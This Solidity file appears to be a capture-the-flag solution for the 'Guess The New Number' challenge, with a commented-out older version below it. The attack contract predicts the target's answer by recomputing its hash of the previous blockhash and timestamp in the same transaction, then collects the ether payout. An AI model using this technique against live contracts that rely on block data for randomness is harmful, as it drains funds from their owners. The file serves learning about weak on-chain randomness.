// SPDX-License-Identifier: No License
pragma solidity ^0.8.17;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;

    function isComplete() external view returns (bool);
}

contract GuessNewAnswer {
    IGuessTheNewNumberChallenge public challenge;
    address public owner;

    constructor(address _challengeAddress) payable {
        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
        require(msg.value == 1 ether);
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        // require(msg.value == 1 ether, "You must send an ether, first");
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        challenge.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    function isComplete() public view returns (bool) {
        return challenge.isComplete();
    }

    receive() external payable {}

    fallback() external payable {}
}

//  pragma solidity ^0.4.21;

// import "./GuessTheNewNumber.sol";

// contract GuessNewAnswer{
//     GuessTheNewNumber challenge;
//     function GuessNewAnswer(address _challenge) public payable {
//         require(msg.value == 1 ether);
//         challenge = GuessTheNewNumber(_challenge);
//     }

//     function solve() public payable {
//         // (msg.sender).transfer(1 ether);
//         // uint8 answer = uint8(keccak256(abi.encodePacked(block.blockhash(block.number - 1), block.timestamp)));
//         // (msg.sender).transfer(address(this).balance);
//         // challenge.guess(answer);
//         // challenge.guess{value: 1 ether}(answer);
//         // challenge.guess{value: 1 ether}(answer);
//         // challenge.guess(answer, {value: 1 ether});
//     }

//     // function complete() public pure returns(bool){
//     //     return true;
//     // }

//     // function complete() public view returns(bool){
//     //     // GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(_challenge);
//     //     return challenge.isComplete();
//     // }

// }
